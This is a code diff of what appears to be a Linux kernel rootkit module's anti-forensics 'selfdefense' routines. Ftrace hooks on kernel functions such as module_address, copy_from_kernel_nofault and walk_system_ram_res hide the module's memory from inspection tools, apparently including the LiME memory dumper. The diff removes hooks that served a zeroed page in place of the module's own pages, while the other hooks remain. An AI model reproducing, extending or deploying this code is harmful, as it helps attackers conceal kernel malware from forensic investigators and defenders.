@@ -172,9 +172,6 @@ static struct module *(*orig_module_address)(unsigned long addr);
 
 static notrace struct module *hook_module_address(unsigned long addr)
 {
-    if (addr == (unsigned long)fh_ftrace_thunk)
-        return orig_module_address(addr);
-
     if (within_module(addr, THIS_MODULE))
         return NULL;
 
@@ -324,39 +321,6 @@ static notrace void sd_restore_iomem(void)
     }
 }
 
-static struct page *sd_zero_page = NULL;
-
-static notrace int sd_page_is_ours(struct page *page)
-{
-    unsigned long mod_start = 0, mod_end = 0;
-    unsigned long phys;
-
-    if (!page) return 0;
-
-    phys = page_to_phys(page);
-    sd_module_phys_range(&mod_start, &mod_end);
-
-    return (mod_end && phys >= mod_start && phys <= mod_end);
-}
-
-static void *(*orig_kmap_atomic)(struct page *page);
-
-static notrace void *hook_kmap_atomic(struct page *page)
-{
-    if (sd_page_is_ours(page) && sd_zero_page)
-        return orig_kmap_atomic(sd_zero_page);
-    return orig_kmap_atomic(page);
-}
-
-static void *(*orig_kmap_local_page)(struct page *page);
-
-static notrace void *hook_kmap_local_page(struct page *page)
-{
-    if (sd_page_is_ours(page) && sd_zero_page)
-        return orig_kmap_local_page(sd_zero_page);
-    return orig_kmap_local_page(page);
-}
-
 static struct ftrace_hook sd_hooks_core[] = {
     HOOK("copy_from_kernel_nofault", hook_copy_from_kernel_nofault,
                                      &orig_copy_from_kernel_nofault),
@@ -369,14 +333,8 @@ static struct ftrace_hook sd_hooks_core[] = {
 };
 
 static struct ftrace_hook sd_hooks_lime[] = {
-    HOOK("walk_system_ram_res",      hook_walk_system_ram_res,
-                                     &orig_walk_system_ram_res),
-    HOOK("walk_iomem_res_desc",      hook_walk_iomem_res_desc,
-                                     &orig_walk_iomem_res_desc),
-    HOOK("kmap_atomic",              hook_kmap_atomic,
-                                     &orig_kmap_atomic),
-    HOOK("kmap_local_page",          hook_kmap_local_page,
-                                     &orig_kmap_local_page),
+    HOOK("walk_system_ram_res",  hook_walk_system_ram_res,  &orig_walk_system_ram_res),
+    HOOK("walk_iomem_res_desc",  hook_walk_iomem_res_desc,  &orig_walk_iomem_res_desc),
 };
 
 static unsigned int sd_lime_installed = 0;
@@ -387,13 +345,9 @@ notrace int selfdefense_init(void)
 
     sd_resource_lock = (rwlock_t *)resolve_sym("resource_lock");
 
-    sd_zero_page = alloc_page(GFP_KERNEL | __GFP_ZERO);
-
     err = fh_install_hooks(sd_hooks_core, ARRAY_SIZE(sd_hooks_core));
-    if (err) {
-        if (sd_zero_page) { __free_page(sd_zero_page); sd_zero_page = NULL; }
+    if (err)
         return err;
-    }
 
     {
         int i;
@@ -423,11 +377,6 @@ notrace void selfdefense_exit(void)
         sd_lime_installed = 0;
     }
     sd_bootstrap_kprobe_unhook();
-
-    if (sd_zero_page) {
-        __free_page(sd_zero_page);
-        sd_zero_page = NULL;
-    }
 
     nsnaps = 0;
 }
